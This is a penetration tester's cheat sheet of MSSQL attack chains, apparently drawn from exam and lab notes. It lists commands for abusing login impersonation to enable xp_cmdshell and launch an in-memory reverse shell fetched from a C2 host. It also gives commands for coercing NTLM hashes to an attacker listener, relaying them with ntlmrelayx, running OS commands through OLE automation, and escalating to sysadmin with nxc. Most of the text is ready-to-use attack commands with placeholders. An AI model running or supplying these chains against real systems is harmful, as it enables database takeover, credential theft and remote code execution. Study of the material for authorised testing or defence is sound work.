# MSSQL Attack Chains

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### MSSQL Login Impersonation → xp_cmdshell RCE (CRTE Exam Report) [added: 2026-04]
- **Tags:** #MSSQL #Impersonation #xp_cmdshell #PowerUpSQL #ExecuteAsLogin #RCE #T1505
- **Trigger:** MSSQL access obtained; IMPERSONATE permission discovered on login
- **Prereq:** MSSQL access; IMPERSONATE permission on a higher-privilege login (e.g., sa)
- **Yields:** OS command execution as SQL service account via xp_cmdshell impersonation chain
- **Opsec:** High
- **Context:** SQL login can impersonate another login (including `sa`). Use `EXECUTE AS LOGIN` chain to enable and abuse `xp_cmdshell`.
- **Payload/Method:**
```powershell
# Load PowerUpSQL
IEX(IWR http://<C2>/PowerUpSQL.ps1 -UseBasicParsing)
Invoke-SQLAudit -Instance <SQL_INSTANCE> -Exploit

# Enable xp_cmdshell via double impersonation
Get-SQLQuery -Instance '<SQL_INSTANCE>' -Query "EXEC AS LOGIN='<INTERMEDIATE_LOGIN>'; EXEC AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1" -User <DOMAIN>\<USER>
Get-SQLQuery -Instance '<SQL_INSTANCE>' -Query "EXEC AS LOGIN='<INTERMEDIATE_LOGIN>'; EXEC AS LOGIN='sa'; EXEC sp_configure 'xp_cmdshell',1" -User <DOMAIN>\<USER>
Get-SQLQuery -Instance '<SQL_INSTANCE>' -Query "EXEC AS LOGIN='<INTERMEDIATE_LOGIN>'; EXEC AS LOGIN='sa'; RECONFIGURE"

# RCE – execute reverse shell in-memory
Get-SQLQuery -Instance '<SQL_INSTANCE>' -Query "EXEC AS LOGIN='<INTERMEDIATE_LOGIN>'; EXEC AS LOGIN='sa'; EXEC xp_cmdshell 'powershell -ep bypass iex(iwr http://<C2>/Invoke-PowerShellTcp.ps1 -UseBasicParsing)'" -User <DOMAIN>\<USER>
```

### MSSQL via Sliver execute-assembly (LabManual Sliver) [added: 2026-04]
- **Tags:** #MSSQL #Sliver #ExecuteAssembly #PowerUpSQL #InMemory #SQLAudit #T1505
- **Trigger:** Active Sliver session; MSSQL instances discovered in domain
- **Prereq:** Sliver beacon session; PowerUpSQL.exe accessible; MSSQL target reachable
- **Yields:** SQL audit results and potential privilege escalation paths on MSSQL instances
- **Opsec:** Med
- **Context:** Enumerate linked SQL servers and run audit from Sliver session.
- **Payload/Method:**
```
[server] sliver (session) > execute-assembly -P <PID> -p 'C:\windows\System32\taskhostw.exe' -t 120 '/path/PowerUpSQL.exe' 'Invoke-SQLAudit -Instance <TARGET> -Verbose'
```

### MSSQL Server Login Enumeration (Roles & Privileges) [added: 2026-04]
- **Tags:** #MSSQL #LoginEnum #ServerRoles #sysadmin #Impersonation #PrivilegeEnum #T1087
- **Trigger:** MSSQL access obtained; need to identify sysadmin and impersonation targets
- **Prereq:** Valid MSSQL login with SELECT on master.sys.server_principals
- **Yields:** Complete list of SQL logins with role memberships (sysadmin, securityadmin, etc.)
- **Opsec:** Low
- **Context:** Enumerate all SQL logins with their server-level role memberships to identify sysadmin, impersonation targets.
- **Payload/Method:**
  ```sql
  SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin
  FROM master.sys.server_principals r
  LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
  WHERE r.type IN ('S','E','X','U','G');
  ```

### MSSQL Trustworthy Database Enumeration [added: 2026-04]
- **Tags:** #MSSQL #Trustworthy #DatabaseEnum #PrivEsc #CreateAssembly #ExecuteAsOwner #T1505
- **Trigger:** Low-privilege MSSQL access; looking for database-level privilege escalation
- **Prereq:** Valid MSSQL login with SELECT on sys.databases
- **Yields:** Databases with TRUSTWORTHY=ON that may allow escalation to sysadmin via db_owner
- **Opsec:** Low
- **Context:** Databases with TRUSTWORTHY=ON and owned by sa/sysadmin can escalate to sysadmin via db_owner CREATE ASSEMBLY or EXECUTE AS OWNER.
- **Payload/Method:**
  ```sql
  SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
  FROM sys.databases a
  JOIN sys.server_principals b ON a.owner_sid = b.sid;
  ```

### MSSQL Impersonation Permission Enumeration [added: 2026-04]
- **Tags:** #MSSQL #Impersonation #PermissionEnum #ExecuteAsLogin #PrivEsc #T1078
- **Trigger:** Need to find impersonation chains for MSSQL privilege escalation
- **Prereq:** Valid MSSQL login with SELECT on sys.server_permissions
- **Yields:** List of logins that can be impersonated (key for EXECUTE AS LOGIN escalation)
- **Opsec:** Low
- **Context:** Identify which logins can be impersonated — key prerequisite for EXECUTE AS LOGIN escalation chains.
- **Payload/Method:**
  ```sql
  SELECT name FROM sys.server_permissions
  JOIN sys.server_principals ON grantor_principal_id = principal_id
  WHERE permission_name = 'IMPERSONATE';
  ```

### MSSQL UNC Path Injection via xp_fileexist [added: 2026-04]
- **Tags:** #MSSQL #xp_fileexist #UNCInjection #NTLMCoercion #HashCapture #T1187
- **Trigger:** MSSQL access obtained; want to coerce NTLM authentication to attacker listener
- **Prereq:** MSSQL access with EXEC permission on xp_fileexist; attacker SMB listener running
- **Yields:** NTLM hash of SQL service account via outbound SMB authentication
- **Opsec:** Med
- **Context:** Alternative to xp_dirtree for coercing NTLM auth. xp_fileexist checks file existence and triggers outbound SMB auth to attacker.
- **Payload/Method:** `EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';`
- **For NTLM coercion:** `EXEC xp_fileexist '\\<ATTACKER_IP>\share\file';`

### MSSQL OLE Automation Procedures for Code Execution [added: 2026-04]
- **Tags:** #MSSQL #OLEAutomation #wscript #COMObject #AlternativeRCE #xp_cmdshell_bypass #T1059
- **Trigger:** xp_cmdshell blocked or disabled; need alternative code execution via MSSQL
- **Prereq:** sysadmin role on MSSQL (to enable OLE Automation Procedures)
- **Yields:** OS command execution via wscript.shell COM object (alternative to xp_cmdshell)
- **Opsec:** High
- **Context:** Alternative to xp_cmdshell when it's blocked. OLE Automation allows creating COM objects (e.g., wscript.shell) for command execution.
- **Payload/Method:**
  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'ole automation procedures', 1; RECONFIGURE;

  -- Execute commands via OLE
  DECLARE @output INT;
  EXEC sp_OACreate 'wscript.shell', @output OUT;
  EXEC sp_OAMethod @output, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';
  ```

### MSSQL Relay to NTLM via ntlmrelayx [added: 2026-04]
- **Tags:** #MSSQL #NTLMRelay #ntlmrelayx #HashRelay #SQLRelay #T1557
- **Trigger:** Captured NTLM auth from coercion; MSSQL target with signing not enforced
- **Prereq:** Captured NTLM authentication; MSSQL target accessible; ntlmrelayx running
- **Yields:** SQL query execution on MSSQL as relayed user (no hash cracking needed)
- **Opsec:** Med
- **Context:** Relay captured NTLM auth directly to MSSQL for query execution without cracking hashes.
- **Payload/Method:** `ntlmrelayx.py -t mssql://DOMAIN\\USER@<MSSQL_IP> -smb2support -q "SELECT name FROM sys.databases;"`

### MSSQL Privesc via nxc mssql_priv Module [added: 2026-04]
- **Tags:** #MSSQL #nxc #NetExec #mssql_priv #ImpersonationChain #sysadminEscalation #T1078
- **Trigger:** Low-privilege MSSQL access; want automated impersonation chain discovery
- **Prereq:** Valid MSSQL credentials; nxc installed
- **Yields:** Automated escalation to sysadmin via impersonation chain (with rollback option)
- **Opsec:** Med
- **Context:** Low-privilege MSSQL user. The mssql_priv module enumerates and exploits impersonation chains to escalate to sysadmin.
- **Payload/Method:**
  ```
  nxc mssql <target> -u <u> -p <p> -M mssql_priv                      # Enumerate
  nxc mssql <target> -u <u> -p <p> -M mssql_priv -o ACTION=privesc    # Exploit
  nxc mssql <target> -u <u> -p <p> -M mssql_priv -o ACTION=rollback   # Rollback
  ```

### MSSQL Command Execution + File Ops via nxc [added: 2026-04]
- **Tags:** #MSSQL #nxc #CommandExec #FileTransfer #sysadmin #RemoteExec #T1059
- **Trigger:** sysadmin on MSSQL; need command execution or file transfer
- **Prereq:** sysadmin role on MSSQL; nxc installed
- **Yields:** OS command execution and file read/write via MSSQL shares
- **Opsec:** Med
- **Context:** Have sysadmin on MSSQL. Execute OS commands or transfer files via shares.
- **Payload/Method:**
  ```
  nxc mssql <target> -u <u> -p <p> -x "whoami"
  nxc mssql <target> -u <u> -p <p> -q "SELECT @@version"
  nxc mssql <target> -u <u> -p <p> --share <share> --get-file <remote> <local>
  nxc mssql <target> -u <u> -p <p> --share <share> --put-file <local> <remote>
  ```
